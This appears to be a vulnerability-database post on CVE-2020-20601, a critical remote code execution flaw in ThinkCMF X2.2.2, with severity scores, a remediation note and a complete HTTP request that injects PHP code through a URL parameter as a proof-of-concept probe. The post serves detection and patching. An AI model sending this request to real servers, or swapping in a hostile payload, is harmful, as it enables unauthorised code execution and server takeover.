---
layout: post
cve_id: CVE-2020-20601
title: ThinkCMF X2.2.2 - Remote Code Execution
pcap: true
pcap_path: /pcaps/2020/CVE-2020-20601.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-20601.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pikpikcu
severity: critical
impact: 'Unauthenticated attackers can execute arbitrary PHP code on ThinkCMF servers,
  leading to complete server compromise and access to all website data.

  '
remediation: 'Upgrade to ThinkCMF version X2.2.3 or later.

  '
reference:
- https://www.shuzhiduo.com/A/l1dygr36Je/
- https://blog.riskivy.com/thinkcmf-%e6%a1%86%e6%9e%b6%e4%b8%8a%e7%9a%84%e4%bb%bb%e6%84%8f%e5%86%85%e5%ae%b9%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2020-20601
  cwe-id: CWE-94
  epss-score: 0.48111
  epss-percentile: 0.97626
  cpe: cpe:2.3:a:thinkcmf:thinkcmf:x2.2.2:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: thinkcmf
  product: thinkcmf
tags:
- cve
- cve2020
- thinkcmf
- rce
- vuln
- vkev
---

## üîç Vulnerability Description
ThinkCMF X2.2.2 and below contain a remote code execution caused by processing crafted packets, letting attackers execute arbitrary code remotely, exploit requires sending malicious packets.


## üåê HTTP Request
```nohighlight
GET /index.php?g=g&m=Door&a=index&content=<?php%20echo%20md5('ThinkCMF'); HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

